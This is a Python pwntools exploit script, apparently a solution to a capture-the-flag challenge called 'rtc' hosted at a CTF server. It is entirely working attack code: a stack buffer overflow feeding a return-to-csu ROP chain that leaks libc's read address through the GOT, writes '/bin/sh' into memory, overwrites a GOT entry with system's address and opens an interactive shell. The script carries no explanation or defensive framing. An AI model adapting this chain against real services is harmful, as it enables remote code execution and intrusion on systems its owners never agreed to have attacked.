from pwn import *

if __debug__:
	#p=gdb.debug('./rtc','b main')
	p=process('./rtc')
	system_offset=0xa5a90
else:
	p=remote('ctf.j0n9hyun.xyz','3025')
	system_offset=0xb1ec0

gadget1=p64(0x4006ba) #rbx=0 rbp=1 r12 r13 r14 r15
gadget2=p64(0x4006a0) # rdx=r13 rsi=r14 edi=r15, call r12(if rbx=0)
binsh="/bin/sh\x00"
read_got=p64(0x601020)
write_got=p64(0x601018)
main=p64(0x4005f6)
bss=p64(0x601048)
data=p64(0x601038)
binsh="/bin/sh\x00"

payload='a'*0x48+gadget1+p64(0)+p64(1)+write_got+p64(8)+read_got+p64(1)+gadget2+p64(0)#*7+main
payload+=p64(0)+p64(1)+read_got+p64(8)+bss+p64(0)+gadget2+p64(0)*7+main

p.recvline()
p.send(payload.ljust(0x200))
read_addr=int(u64(p.recv()))
p.send(binsh)

system_addr=read_addr-system_offset

payload2='b'*0x48+gadget1+p64(0)+p64(1)+read_got+p64(8)+data+p64(0)+gadget2+p64(0)
payload2+=p64(0)+p64(1)+data+p64(0)+p64(0)+bss+gadget2

p.recvline()
p.send(payload2.ljust(0x200))
p.send(p64(system_addr))

p.interactive()
p.close()
